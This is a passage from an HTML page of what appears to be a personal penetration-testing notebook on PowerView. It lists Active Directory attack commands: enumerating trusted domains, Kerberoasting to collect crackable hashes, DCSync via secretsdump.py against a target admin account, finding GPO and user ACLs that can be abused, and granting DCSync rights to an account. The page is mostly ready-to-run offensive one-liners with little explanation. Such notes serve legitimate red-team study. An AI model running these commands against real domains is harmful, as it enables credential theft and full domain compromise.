<li><code>PIM_TRUST</code> (0x00000400) : &quot;<em>If this bit and the <code>TATE</code> (treat as external) bit are set, then a cross-forest trust to a domain is to be treated as <code>Privileged Identity Management</code> trust for the purposes of <code>SID</code> Filtering.</em>&quot; According to <code>MS-PAC 4.1.2.2 (SID Filtering and Claims Transformation)</code>, &quot;<em>A domain can be externally managed by a domain that is outside the forest. The trusting domain allows <code>SIDs</code> that are local to its forest to come over a <code>PrivilegedIdentityManagement</code> trust.</em>&quot; While I have not seen this in the field, and it&apos;s only supported by domain functional level <code>2012R2</code> and above, it also warrants further investigation</li>
</ul>
<h2 id="get-information-from-a-trusted-domain">Get information from a trusted domain</h2>
<p><code>DcIp</code> is the IP is the IP of the initial domain controller</p>
<pre><code class="lang-powershell">Get-DomainUser -domain ${trustedDomain} -server ${dcIp}
</code></pre>
<h2 id="get-groups-with-user-from-other-domains">Get groups with user from other domains</h2>
<p>Return the groups of the <code>targetDomain</code> that contain at least one user that is not from the <code>targetDomain</code> domain.</p>
<p>The <code>SID</code> returned cna be converted using the <code>Convert-SID</code> <code>Powershell</code> command.</p>
<pre><code class="lang-powershell">Get-DomainForeignGroupMember -Domain ${targetDomain}
</code></pre>
<h1 id="kerberoasting">Kerberoasting</h1>
<p>Collected hash need to be cracked</p>
<pre><code class="lang-powershell">Invoke-Kerberoast -domain ${domain} -server ${dcIp} -OutputFormat John| fl
</code></pre>
<ul>
<li>The output format can be modify to format hash for <code>John</code> or <code>Hashcat</code></li>
</ul>
<h1 id="dcsync">DCSync</h1>
<pre><code class="lang-bash">secretsdump.py <span class="hljs-variable">${domain}</span>/<span class="hljs-variable">${user}</span>@<span class="hljs-variable">${dcIp}</span> -just-dc-user <span class="hljs-variable">${adminUserToPwn}</span>
</code></pre>
<h1 id="unconstrained-delegation">Unconstrained Delegation</h1>
<pre><code class="lang-powershell">Get-DomainComputer -Unconstrained
</code></pre>
<h1 id="users-that-can-modify-gpo">Users that can modify GPO</h1>
<pre><code class="lang-powershell">Get-DomainObjectAcl -SearchBase <span class="hljs-string">&quot;CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io&quot;</span> -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-nomarkup">-eq</span> <span class="hljs-string">&quot;Group-Policy-Container&quot;</span> } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
</code></pre>
<p>It will return the <code>SID</code> of the users that can modify the <code>GPO</code>. The <code>SID</code> can be translated using <code>ConvertFrom-SID</code></p>
<p>Likewise, it is possible to retrieve the <code>GPO</code> that can be modified by agiven user:</p>
<pre><code class="lang-powershell">Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-nomarkup">-match</span> <span class="hljs-string">&quot;WriteProperty|WriteDacl|WriteOwner&quot;</span> -and <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-nomarkup">-match</span> <span class="hljs-string">&quot;${userSID}&quot;</span> } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
</code></pre>
<h1 id="acl-on-users">ACL on users</h1>
<p>Retrieve the <code>ACL</code> <code>compromisedUser</code> can modify on the <code>userTargeted</code> object.</p>
<pre><code class="lang-powershell">Get-DomainObjectAcl -Identity ${userTargeted} | ? { <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-nomarkup">-match</span> <span class="hljs-string">&quot;GenericAll|WriteProperty|WriteDacl&quot;</span> -and <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-nomarkup">-match</span> <span class="hljs-string">&quot;${compromisedUserSID}&quot;</span> } | select SecurityIdentifier, ActiveDirectoryRights | fl
</code></pre>
<h1 id="grant-dcsync">Grant DCSync</h1>
<pre><code class="lang-powershell">Add-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;${userIdentity}&quot;</span> -PrincipalIdentity bfarmer -Rights DCSync
</code></pre>
<p>With <code>userIdentity</code> passed as : <code>DC=dev,DC=oth,DC=io</code> </p>
<h1 id="ressource">Ressource</h1>
<ul>
<li>PowerView snippets : <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" target="_blank">https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</a></li>
<li>PowerView documentation : <a href="https://powersploit.readthedocs.io/" target="_blank">https://powersploit.readthedocs.io/</a></li>
<li>Attacking trusted domains : <a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" target="_blank">http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</a></li>
</ul>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="Hydra.html" class="navigation navigation-prev " aria-label="Previous page: Hydra">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="Powershell.html" class="navigation navigation-next " aria-label="Next page: Powershell">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"PowerView","level":"1.5.6.7","depth":3,"next":{"title":"Powershell","level":"1.5.6.8","depth":3,"path":"Pentest/Tools/Powershell.md","ref":"Pentest/Tools/Powershell.md","articles":[]},"previous":{"title":"Hydra","level":"1.5.6.6","depth":3,"path":"Pentest/Tools/Hydra.md","ref":"Pentest/Tools/Hydra.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing","collapsible-chapters@git+https://gitlab.dqr/gitbook-plugin/collapsible-chapters.git#main","copy-code-button@git+https://gitlab.dqr/gitbook-plugin/copy-code-button.git#main","hide-published-with","search-plus","simple-page-toc"],"pluginsConfig":{"github":{"url":"https://github.com/YoannDqr"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"search":{},"collapsible-chapters":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"hide-published-with":{},"fontsettings":{"theme":"white","family":"sans","size":2},"twitter":{"url":"https://twitter.com/HackerOtter"},"highlight":{},"copy-code-button":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Pentest/Tools/PowerView.md","mtime":"2023-05-14T19:07:17.504Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2024-06-15T20:10:52.465Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-hide-published-with/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

